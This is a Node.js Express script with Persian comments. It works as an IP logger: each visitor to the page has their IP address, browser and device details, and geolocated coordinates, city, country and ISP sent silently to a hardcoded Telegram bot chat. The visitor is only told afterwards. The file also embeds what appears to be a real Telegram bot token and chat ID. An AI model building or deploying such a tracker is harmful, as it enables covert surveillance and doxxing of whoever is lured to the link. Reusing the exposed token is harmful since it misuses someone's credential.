const express = require('express');
const axios = require('axios');
const useragent = require('useragent');
const app = express();
const PORT = 3000;

// تنظیمات شما
const TELEGRAM_TOKEN = '6902577133:AAH6xgnhQvWPfgdQUwdB59da-uWZgsb2Vkw';
const CHAT_ID = '1848591768';

app.get('/', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = useragent.parse(req.headers['user-agent']);

    // گرفتن موقعیت مکانی
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const { lat, lon, city, country, isp } = geoRes.data;

    // ساخت آیدی یکتا
    const uniqueId = `${Date.now()}_${ip}`;

    // متن کپشن
    const caption = `
آیدی: ${uniqueId}
IP: ${ip}
کشور: ${country}
شهر: ${city}
ISP: ${isp}
دستگاه: ${userAgent.toString()}
    `;

    // ارسال لوکیشن با کپشن
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
      chat_id: CHAT_ID,
      latitude: lat,
      longitude: lon,
      disable_notification: true
    });

    // ارسال کپشن جداگانه
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: caption
    });

    res.send('<h2>موقعیت شما با موفقیت ارسال شد.</h2>');
  } catch (error) {
    console.error(error);
    res.status(500).send('خطا در دریافت موقعیت یا ارسال به تلگرام');
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
